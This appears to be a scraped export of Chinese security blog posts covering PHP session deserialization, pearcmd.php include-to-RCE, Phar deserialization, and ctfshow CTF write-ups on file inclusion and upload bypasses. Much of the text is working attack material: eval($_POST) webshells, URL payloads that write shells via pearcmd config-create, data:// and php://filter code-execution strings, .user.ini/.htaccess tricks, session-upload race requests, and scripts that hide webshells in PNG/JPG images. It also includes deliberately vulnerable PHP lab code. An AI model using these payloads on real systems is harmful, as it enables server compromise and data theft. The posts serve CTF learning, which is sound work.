text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: PHPSESSID=ir85hm42ah4mln0ko3svp355ciUpgrade-Insecure-Requests: 1haha=§1§ success 最后放一张流程图,虽然和我做的实验不一样，但是意思就是这个意思，参考：F4ke12138 session_decode1session_decode(string `$data`): bool session_decode() 对 $data 参数中的已经序列化的会话数据进行解码， 并且使用解码后的数据填充 $_SESSION 超级全局变量。 请注意，这里的反序列化方法不同于 unserialize() 函数。 序列化方法是 PHP 内置的，并且可以通过 session.serialize_handler 配置项进行修改。 实验一创建一个session.php文件，内容如下： 123456789101112131415161718&lt;?php highlight_file(__FILE__);session_start(); $sessionData = $_POST['data'];session_decode($sessionData);var_dump($_SESSION);class zixyd{ public $a; public function __destruct(){ eval($this-&gt;a); }}?&gt; 1POST: data=username|s:5:&quot;zixyd&quot;; 123┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_l177lcnaktemebo1dr0uq0c2omusername|s:5:&quot;zixyd&quot;; 成功将username|s:5:&quot;zixyd&quot;; 写入到session文件中， 如果写入的是恶意数据呢？ 1POST: data=shell|O:5:&quot;zixyd&quot;:1:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;} 123┌──(root㉿kali)-[/var/lib/php/sessions]└─# cat sess_l177lcnaktemebo1dr0uq0c2omusername|s:5:&quot;zixyd&quot;;shell|O:5:&quot;zixyd&quot;:1:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;} 成功执行phpinfo(); 可以看到当session_decode函数的值是可控时，是非常危险的","link":"/2024/01/07/session%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/"},{"title":"pearcmd.php","text":"register_argc_argv当php.ini中register_argc_argv是on时，$_SERVER['argv']可以获得命令行参数。 register_argc_argv默认是off,所以在本地做实验时,需要自己修改一下php.ini； 创建一个test.php内容如下 123456789101112&lt;?phphighlight_file(__FILE__);var_dump($_SERVER['argv']);echo &quot;&lt;/br&gt;&quot;;echo $_SERVER['argc'].&quot;&lt;/br&gt;&quot;;$_SERVER['argv'][0]($_SERVER['argv'][1]);phpinfo()?&gt; 成功执行命令 也可从phpinfo中看出$_SERVER['argv']的值 pearcmd.phppear,peclpear和pecl都是与PHP扩展相关的工具。PEAR（PHP Extension and Application Repository）是一个PHP扩展和应用程序的存储库，它允许用户轻松地安装和管理PHP代码。PECL（PHP Extension Community Library）是一个独立的项目，它提供了一些PHP扩展，这些扩展通常不包含在PHP的核心发行版中。PECL中的扩展通常需要通过PECL工具来安装和管理。因此，PEAR和PECL都是用于管理PHP扩展的工具，但它们的内容和用途略有不同。 来自p神：pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定--with-pear才会安装。 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在/usr/local/lib/php 安装1sudo apt install php-pear linux默认路径 1/usr/share/php/pearcmd.php 当我查看pear和pec个文件有什么区别时；你会发现这个文件只有最后一行不太一样，基本都是去调用了/usr/share/php/peclcmd.php 1234567┌──(kali㉿kali)-[/usr/share/php]└─$ which pecl /usr/bin/pecl ┌──(kali㉿kali)-[/usr/share/php]└─$ which pear/usr/bin/pear /usr/share/php/peclcmd.php其实没什么用，就是检查一下路径，再去包含pearcmd.php，当你使用pecl或pear命令是，其本质就是去运行了pearcmd.php文件，可以说pearcmd.php文件就是pear或pecl命令行的源码;(这里当时我还把perl和pecl搞混淆了） 1234567891011121314#peclcmd.php&lt;?phpif ('/usr/share/php ' != '@'.'include_path'.'@ ') { ini_set('include_path', trim('/usr/share/php '). PATH_SEPARATOR . get_include_path()); $raw = false;} else { ini_set('include_path', __DIR__ . PATH_SEPARATOR . get_include_path()); $raw = true;}define('PEAR_RUNTYPE', 'pecl');require_once 'pearcmd.php';?&gt; 漏洞利用漏洞利用漏洞利用：include+register_argc_argv=on+pearcmd.php 在Console/Getopt.php中的readPHPArgv函数中可以通过Web访问了pear命令行的功能，且能够控制命令行的参数 123456789101112131415public static function readPHPArgv(){ global $argv; if (!is_array($argv)) { if (!@is_array($_SERVER['argv'])) { if (!@is_array($GLOBALS['HTTP_SERVER_VARS']['argv'])) { $msg = &quot;Could not read cmd args (register_argc_argv=Off?)&quot;; return PEAR::raiseError(&quot;Console_Getopt: &quot; . $msg); } return $GLOBALS['HTTP_SERVER_VARS']['argv']; } return $_SERVER['argv']; } return $argv;} 在pear中有一个config-create参数可以创建文件，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中(这个参数也要也/开头) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960┌──(kali㉿kali)-[/usr/share/php]└─$ php pearcmd.php | grep config-createconfig-create Create a Default configuration file┌──(kali㉿kali)-[/usr/share/php]└─$ pear config-createconfig-create: must have 2 parameters, root path and filename to save as┌──(kali㉿kali)-[/usr/share/php]└─$ pear config-create /zixyd_good_boy /tmp/zixydConfiguration (channel pear.php.net):=====================================Auto-discover new Channels auto_discover &lt;not set&gt;Default Channel default_channel pear.php.netHTTP Proxy Server Address http_proxy &lt;not set&gt;PEAR server [DEPRECATED] master_server &lt;not set&gt;Default Channel Mirror preferred_mirror &lt;not set&gt;Remote Configuration File remote_config &lt;not set&gt;PEAR executables directory bin_dir /zixyd_good_boy/pearPEAR documentation directory doc_dir /zixyd_good_boy/pear/docsPHP extension directory ext_dir /zixyd_good_boy/pear/extPEAR directory php_dir /zixyd_good_boy/pear/phpPEAR Installer cache directory cache_dir /zixyd_good_boy/pear/cachePEAR configuration file cfg_dir /zixyd_good_boy/pear/cfgdirectoryPEAR data directory data_dir /zixyd_good_boy/pear/dataPEAR Installer download download_dir /zixyd_good_boy/pear/downloaddirectorySystems manpage files man_dir /zixyd_good_boy/pear/mandirectoryPEAR metadata directory metadata_dir &lt;not set&gt;PHP CLI/CGI binary php_bin &lt;not set&gt;php.ini location php_ini &lt;not set&gt;--program-prefix passed to php_prefix &lt;not set&gt;PHP's ./configure--program-suffix passed to php_suffix &lt;not set&gt;PHP's ./configurePEAR Installer temp directory temp_dir /zixyd_good_boy/pear/tempPEAR test directory test_dir /zixyd_good_boy/pear/testsPEAR www files directory www_dir /zixyd_good_boy/pear/wwwCache TimeToLive cache_ttl &lt;not set&gt;Preferred Package State preferred_state &lt;not set&gt;Unix file mask umask &lt;not set&gt;Debug Log Level verbose &lt;not set&gt;PEAR password (for password &lt;not set&gt;maintainers)Signature Handling Program sig_bin &lt;not set&gt;Signature Key Directory sig_keydir &lt;not set&gt;Signature Key Id sig_keyid &lt;not set&gt;Package Signature Type sig_type &lt;not set&gt;PEAR username (for username &lt;not set&gt;maintainers)User Configuration File Filename /tmp/zixydSystem Configuration File Filename #no#system#config#Successfully created default configuration file &quot;/tmp/zixyd&quot;┌──(kali㉿kali)-[/usr/share/php]└─$ cat /tmp/zixyd #PEAR_Config 0.9a:12:{s:7:&quot;php_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/php&quot;;s:8:&quot;data_dir&quot;;s:25:&quot;/zixyd_good_boy/pear/data&quot;;s:7:&quot;www_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/www&quot;;s:7:&quot;cfg_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/cfg&quot;;s:7:&quot;ext_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/ext&quot;;s:7:&quot;doc_dir&quot;;s:25:&quot;/zixyd_good_boy/pear/docs&quot;;s:8:&quot;test_dir&quot;;s:26:&quot;/zixyd_good_boy/pear/tests&quot;;s:9:&quot;cache_dir&quot;;s:26:&quot;/zixyd_good_boy/pear/cache&quot;;s:12:&quot;download_dir&quot;;s:29:&quot;/zixyd_good_boy/pear/download&quot;;s:8:&quot;temp_dir&quot;;s:25:&quot;/zixyd_good_boy/pear/temp&quot;;s:7:&quot;bin_dir&quot;;s:20:&quot;/zixyd_good_boy/pear&quot;;s:7:&quot;man_dir&quot;;s:24:&quot;/zixyd_good_boy/pear/man&quot;;} 实验一创建一个index.php，内容如下： 123456789&lt;?phphighlight_file(__FILE__);if($_GET['zixyd']){ include $_GET['zixyd'];}phpinfo();?&gt; payload,下面几种都可以，没什么好说的；尝试自己理解一下 1/index.php?+config-create+/&amp;zixyd=/usr/share/php/pearcmd.php&amp;/&lt;?=eval($_POST[1])?&gt;+/tmp/test1.php 1/index.php?&amp;zixyd=/usr/share/php/pearcmd.php&amp;+config-create+/&lt;?=eval($_POST[1])?&gt;+/tmp/test2.php 1/index.php?+config-create+/&lt;?=eval($_POST[1])?&gt;&amp;zixyd=/usr/share/php/pearcmd.php&amp;+/tmp/test3.php 疑惑为什么config-create参数都要从第二个参数开始：","link":"/2024/01/08/pearcmd/"},{"title":"ctfshow(include)","text":"web78(php://filter)123456if(isset($_GET['file'])){ $file = $_GET['file']; include($file);}else{ highlight_file(__FILE__);} payload 利用php://filter协议 1?file=php://filter/convert.base64-encode/resource=flag.php web79(data)1234567if(isset($_GET['file'])){ $file = $_GET['file']; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);}else{ highlight_file(__FILE__);} payload 这里上一题的方法可以用大小写绕过；但是也可以借助data协议:include配合data导致的命令执行; 1234?file=data://text/plain,&lt;?pHp system('cat flag*');?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system('cat flag.php'); web80-81(log_file)包含日志文件， 1?file=/var/log/nginx/access.log 注意日志文件权限一般为： 12ls -al /var/log/nginx/access.log-rw-r----- 1 www-data adm 0 1月13日 22:29 /var/log/nginx/access.log web82-86(session)可以看我这篇博客 https://zixyd.github.io/2024/01/07/session%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/#session-upload-progress web87(php://fiter死亡绕过)12345678910111213if(isset($_GET['file'])){ $file = $_GET['file']; $content = $_POST['content']; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die('大佬别秀了');?&gt;&quot;.$content); }else{ highlight_file(__FILE__);} 利用base64 4位密文为一个明文的特性1php://filter/write=convert.base64-decode/resource=1.php 1GET：?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30 1POST: content=aaPD9waHAgc3lzdGVtKCRfUE9TVFsxXSk7Pz4= 利用string.rot13过滤器构造： 1php://filter/write=string.rot13/resource=2.php web88(data)123456789if(isset($_GET['file'])){ $file = $_GET['file']; if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file)){ die(&quot;error&quot;); } include($file);}else{ highlight_file(__FILE__);} 发现过滤的还是比较多，但是没有过滤 : 那我们就可以使用PHP伪协议就是 这里使用的是 data://text/plain;base64,poc 其实和79差不多 只是注意的是编码成base64的时候要去掉 ＝ 实际上就是去掉base64后的=，作为填充使用，不影响结果 1?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmwwZy5waHAnKTsgPz4 web116(misc)保存视频，用winhex打开发现包含png图片，分离出来,可以看到源码 payload,需要抓包，misc，没意思 1?file=flag.php web117(file_pust_content死亡绕过)1234567891011highlight_file(__FILE__);error_reporting(0);function filter($x){ if(preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i',$x)){ die('too young too simple sometimes naive!'); }}$file=$_GET['file'];$contents=$_POST['contents'];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents); payload 通过usc-2的编码进行转换；对目标字符串进行2位一反转；（因为是两位一反转，所以字符的数目需要保持在偶数位上） file_put_content和死亡·杂糅代码之缘 12file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?","link":"/2024/01/18/ctfshow(include)/"},{"title":"ctfshow(upload)","text":"web151(前端校验)前端验证，修改png为php 1lay-data=&quot;{url: 'upload.php', accept: 'images',exts:'php'}&quot; 上传php文件 1234&lt;?phpeval($_POST[1]);phpinfo();?&gt; web152(content-type)通过前端校验后上传php文件显示文件类型不合规 尝试抓包修改content-type，根据数据包回显得知上传成功。 12345678910111213141516171819202122232425POST /upload.php HTTP/1.1Host: ef68ad4a-40fd-479c-aa14-0a4c9d2c0650.challenge.ctf.showContent-Length: 217Pragma: no-cacheCache-Control: no-cacheAccept: application/json, text/javascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWg0lhgBOIRNo5bIGOrigin: http://ef68ad4a-40fd-479c-aa14-0a4c9d2c0650.challenge.ctf.showReferer: http://ef68ad4a-40fd-479c-aa14-0a4c9d2c0650.challenge.ctf.show/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryWg0lhgBOIRNo5bIGContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;Content-Type: image/png&lt;?phpeval($_POST[1]);phpinfo();?&gt;------WebKitFormBoundaryWg0lhgBOIRNo5bIG-- web153(.user.ini)虽然将后缀名改为phtml,php5等，可以上传成功，但是服务器并不解析 .user.ini文件其实就是PHP的一个局部配置文件，可以通过配置选项使每个php文件头或文件尾都进行文件包含 .htaccess文件是Apache Web服务器的配置文件；Nginx并不使用.htaccess文件 12auto_prepend_file = &lt;filename&gt; //包含在文件头auto_append_file = &lt;filename&gt; //包含在文件尾 payload 上传a.png 1234&lt;?phpeval($_POST[1]);phpinfo();?&gt; 上传.user.ini 1auto_prepend_file = a.png web154-155(内容检测”php”)payload 利用上题的方法，将a.png的内容改成如下，利用短标签 123&lt;?=eval($_POST[1]);?&gt; PHP四种标记风格 1.XML风格 123&lt;?phpeval($_POST['cmd']); ?&gt; php推荐使用的标记风格。服务器管理员无法禁用，所有服务器上均可使用该风格。 2.脚本风格 123&lt;script language=&quot;php&quot;&gt; eval($_POST['cmd']);&lt;/script&gt; 默认开启，无法禁用笔者曾遇到过一CTF题目，要求上传shell，但是却对文件内容做了过滤 ，&lt;? 以及 php，替换为了空格。此种风格中，language的值，大小写都可以，因此可以构造如下代码进行绕过 123&lt;script language=&quot;PhP&quot;&gt; eval($_POST['cmd']);&lt;/script&gt; 3.简短风格 123&lt;? eval($_POST['cmd']);?&gt; 此种风格需要在配置文件php.ini中启用short_open_tage选项此种风格在许多环境中默认是不支持的 4.ASP风格 123&lt;% eval($_POST['cmd']);%&gt; 此种风格需要在配置文件php.ini中启用asp_tag选项在默认情况下是禁用的原文链接：https://blog.csdn.net/qq_35085863/article/details/76714367 web156(内容检测’[‘)12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-10-24 19:34:52# @Last Modified by: h1xa# @Last Modified time: 2020-10-26 15:49:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){ $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;$_FILES[&quot;file&quot;][&quot;error&quot;]);}else{ $filename = $_FILES[&quot;file&quot;][&quot;name&quot;]; $filesize = ($_FILES[&quot;file&quot;][&quot;size&quot;] / 1024); if($filesize&gt;1024){ $ret = array(&quot;code&quot;=&gt;1,&quot;msg&quot;=&gt;&quot;文件超过1024KB&quot;); }else{ if($_FILES['file']['type'] == 'image/png'){ $arr = pathinfo($filename); $ext_suffix = $arr['extension']; if($ext_suffix!='php'){ $content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]); if(stripos($content, &quot;php&quot;)===FALSE &amp;&amp; stripos($content,&quot;[&quot;)===FALSE){ move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]); $ret = array(&quot;code&quot;=&gt;0,&quot;msg&quot;=&gt;&quot;upload/&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;]); }else{ $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;); } }else{ $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;); } }else{ $ret = array(&quot;code&quot;=&gt;2,&quot;msg&quot;=&gt;&quot;文件类型不合规&quot;); } }}echo json_encode($ret); stripos — 查找字符串首次出现的位置（不区分大小写）; 过滤了**[ ]** 可以用{}替代 web157-158(内容检测 ‘{}’ ,’;’)payload,php最后一句话可以不用加分号 123&lt;?= system('tac ../f*')?&gt; web159(内容检测”()”，”log”)使用反引号 12&lt;=echo `whoami` web160(内容检测空格)使得a.png的内容如下，包含日志文件 1&lt;?=include&quot;/var/lo&quot;.&quot;g/nginx/access.lo&quot;.&quot;g&quot;?&gt; web161-162文件头检测)上传文件时加上图片文件头 1GIF89a web163(内容检测 “.”)利用.user.ini，使得文件包含/tmp/sess_id;我这里并没有从哪里看出来开启了session; 上传.user.ini文件 12GIF89aauto_prepend_file=/tmp/sess_zixyd 表单 123456789&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://d0908251-27cd-4ecc-b549-e6d9c1a0abdc.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&lt;?php system('cat ../flag.php');?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; payload，用bp的intruder, 12345678910111213141516171819202122232425POST / HTTP/1.1Host: d0908251-27cd-4ecc-b549-e6d9c1a0abdc.challenge.ctf.showContent-Length: 324Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: nullContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryjvhYci6ebBvox39yUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateCookie: PHPSESSID=zixydAccept-Language: zh-CN,zh;q=0.9Connection: close------WebKitFormBoundaryjvhYci6ebBvox39yContent-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;§1§&lt;?php system('cat ../flag.php');?&gt;------WebKitFormBoundaryjvhYci6ebBvox39yContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.txt&quot;Content-Type: text/plainzixyd------WebKitFormBoundaryjvhYci6ebBvox39y-- 123456789101112GET /upload/index.php HTTP/1.1Host: d0908251-27cd-4ecc-b549-e6d9c1a0abdc.challenge.ctf.showPragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close§1§ web164(png二次渲染)直接用大佬的脚本生成木马文件 1234567891011121314151617181920212223242526272829303132&lt;?php$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33);$img = imagecreatetruecolor(32, 32);for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color);}imagepng($img,'1.png'); //要修改的图片的路径/* 木马内容&lt;?$_GET[0]($_POST[1]);?&gt; *///imagepng($img,'1.png'); 要修改的图片的路径,1.png是使用的文件，可以不存在//会在目录下自动创建一个1.png图片//图片脚本内容：$_GET[0]($_POST[1]);//使用方法：例子：查看图片，get传入0=system；post传入tac flag.php?&gt; web165(jpg二次渲染)jpg的成功率很低 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149&lt;?php#用法，在目录那里cmd打开然后php 文件名 图片名$miniPayload = '&lt;?=eval($_POST[1]);?&gt;';if (!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed');}if (!isset($argv[1])) { die('php jpg_payload.php &lt;jpg_name.jpg&gt;');}set_error_handler(&quot;custom_error_handler&quot;);for ($pad = 0; $pad &lt; 1024; $pad++) { $nullbytePayloadSize = $pad; $dis = new DataInputStream($argv[1]); $outStream = file_get_contents($argv[1]); $extraBytes = 0; $correctImage = TRUE; if ($dis-&gt;readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while ((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == 0xFF)) { $marker = $dis-&gt;readByte(); $size = $dis-&gt;readShort() - 2; $dis-&gt;skip($size); if ($marker === 0xDA) { $startPos = $dis-&gt;seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(&quot;\\0&quot;, $nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_' . $argv[1], $outStreamTmp, TRUE); if ($extraBytes !== 0) { while ((!$dis-&gt;eof())) { if ($dis-&gt;readByte() === 0xFF) { if ($dis-&gt;readByte !== 0x00) { break; } } } $stopPos = $dis-&gt;seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(&quot;\\0&quot;, $nullbytePayloadSize) . substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize + $imageStreamSize - $extraBytes) . substr($outStream, $stopPos); } elseif ($correctImage) { $outStream = $outStreamTmp; } else { break; } if (checkImage('payload_' . $argv[1], $outStream)) { die('Success!'); } else { break; } } }}unlink('payload_' . $argv[1]);die('Something\\'s wrong');function checkImage($filename, $data, $unlink = FALSE){ global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if ($unlink) unlink($filename); return $correctImage;} function custom_error_handler($errno, $errstr, $errfile, $errline){ global $extraBytes, $correctImage; $correctImage = FALSE; if (preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if (isset($m[1])) { $extraBytes = (int)$m[1]; } }} class DataInputStream{ private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this-&gt;binData = ''; $this-&gt;order = $order; if (!$fromString) { if (!file_exists($filename) || !is_file($filename)) die('File not exists [' . $filename . ']'); $this-&gt;binData = file_get_contents($filename); } else { $this-&gt;binData = $filename; } $this-&gt;size = strlen($this-&gt;binData); } public function seek() { return ($this-&gt;size - strlen($this-&gt;binData)); } public function skip($skip) { $this-&gt;binData = substr($this-&gt;binData, $skip); } public function readByte() { if ($this-&gt;eof()) { die('End Of File'); } $byte = substr($this-&gt;binData, 0, 1); $this-&gt;binData = substr($this-&gt;binData, 1); return ord($byte); } public function readShort() { if (strlen($this-&gt;binData) &lt; 2) { die('End Of File'); } $short = substr($this-&gt;binData, 0, 2); $this-&gt;binData = substr($this-&gt;binData, 2); if ($this-&gt;order) { $short = (ord($short[1]) &lt;&lt; 8) + ord($short[0]); } else { $short = (ord($short[0]) &lt;&lt; 8) + ord($short[1]); } return $short; } public function eof() { return !$this-&gt;binData || (strlen($this-&gt;binData) === 0); }} ?&gt; web166(zip文件包含)只能上传zip文件 1lay-data=&quot;{url: 'upload.php', accept: 'images',exts:'zip'}&quot; download.php存在文件包含， 1upload/download.php?file=e46801abff88087e1938a39472b8a1f0.zip 随便压缩一个文件，右击压缩后的zip文件打开；加上木马 123456PK\u0003\u0004 绬3X8?Q\u0003 \u0003 \u0005 1.txt鍟奝K\u0001\u0002? 绬3X8?Q\u0003 \u0003 \u0005 $ 1.txt \u0001 \u0018 U?礘? PK\u0005\u0006 \u0001 \u0001 W &amp; &lt;?php @eval($_POST[1]);?&gt; 上传之后，直接用蚁剑即可连接 12url: http://38b16135-3b29-49f9-aa9e-63f555279256.challenge.ctf.show/upload/download.php?file=e46801abff88087e1938a39472b8a1f0.zippass: 1 web167(htaccess)hint:httpd htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能 上传1.jpg文件 1234&lt;?phpeval($_POST[1]);phpinfo();?&gt; 上传.htaccess文件，并把1.jpg文件用php解析 123&lt;FilesMatch &quot;1.jpg&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 其实这个我感觉挺奇怪的，响应标头表示的是nginx服务器，但是却可以用htaccess配置文件？ 12345678HTTP/1.1 200 OKServer: nginx/1.20.1Date: Fri, 19 Jan 2024 10:07:18 GMTContent-Type: text/html; charset=UTF-8Content-Length: 1657Connection: closeVary: Accept-EncodingX-Powered-By: PHP/5.6.40 web168(姿势绕过)经过测试发现，文件上传点将eval和system以及post和get过滤了也可以使用反引号来进行命令执行，通过不断修改上传文件中的内容和不断访问该文件来获取flag 1&lt;?php echo `tac ../f*`;?&gt; 还有其他方式； 1234&lt;?php$a=substr(&quot;1sys&quot;,1).&quot;tem&quot;; 返回字符串中第一位以后的字符串$a($_REQUEST['pass']);?&gt; web169-170(过滤了”&lt;”)吐槽：只能上传zip文件，但是Content-Type又必须是图片类型； 随便上传一个php文件，然后用.user.ini包含日志文件 1234Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.user.ini&quot;Content-Type: image/pngauto_prepend_file=/var/log/nginx/access.log","link":"/2024/01/19/ctfshow(upload)/"},{"title":"Phar漏洞","text":"什么是Pharjar是开发java程序的应用，包括所有可执行，可访问的文件打包，方便部署; phar是php里类似jar的一种打包文件对于php5.3或更高版本，phar后缀文件是默认开启支持的，可以直接使用它 Phar结构stub phar文件标识，格式为xxx&lt;?php xxx;HALT_COMPiLER0;?&gt;;(头部信息)manifest压缩文件的属性等信息，以序列化存储：contents压缩文件的内容；signature签名，放在文件末尾； Phar协议解析文件时，会自动触发对nanifest字段的序列化字符串进行反序列化； 实验一(基本的phar利用)创建一个test002.php 1234567891011121314&lt;?phphighlight_file(__FILE__);class zixyd { public $code; public function __destruct() { echo '_destruct() called!'.&quot;&lt;/br&gt;&quot;; eval($this-&gt;code); }}$filename = $_GET['file'];echo is_file($filename); 创建一个test.php用来生成phar;Phar需要PHP &gt;=5.2在php.ini中将phar.readonly设为off，否则生成phar文件时会报错 执行test.php生成phar文件 1234567891011121314&lt;?phpclass zixyd { public $code=&quot;eval(\\$_POST[1]);&quot;;}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$o = new zixyd();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering(); 生成的phar.phar文件结构如下： 12345--phar.phar --.phar --.metadata.bin --signature.bin --stub.php 12#.metadata.binO:5:&quot;zixyd&quot;:1:{s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;} 12stub.php&lt;?php __HALT_COMPILER(); ?&gt; 最终成功执行 受影响的函数123456789101112131415161718192021222324fileatimefilectimefile_existsfile_get_contentsfile_put_contentsfilefilegroupfopenfileinodefilemtimefileownerfilepermsis_diris_executableis_fileis_linkis_readableis_writableis_writeableparse_ini_filecopyunlinkstatreadfile 